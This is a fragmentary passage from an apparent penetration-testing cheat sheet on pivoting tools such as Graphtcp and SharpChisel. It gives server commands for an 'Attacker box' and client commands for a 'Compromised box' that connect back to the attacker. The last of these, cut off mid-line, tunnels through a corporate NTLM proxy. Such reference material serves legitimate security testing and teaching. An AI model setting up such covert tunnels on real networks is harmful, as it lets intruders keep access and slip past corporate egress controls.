...
## Graphtcp, Same as proxychains, with another mechanism to "proxify" which allow Go applications.
```powershell
...
```
### SharpChisel, A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel
```powershell
...
> Server (Attacker box)
```python
>>> server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```
# Client (Compromised box)
```python
>>> client.py --server-ip <ip> --server-port 9443
```
# Through corporate proxy
```python
>>> client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
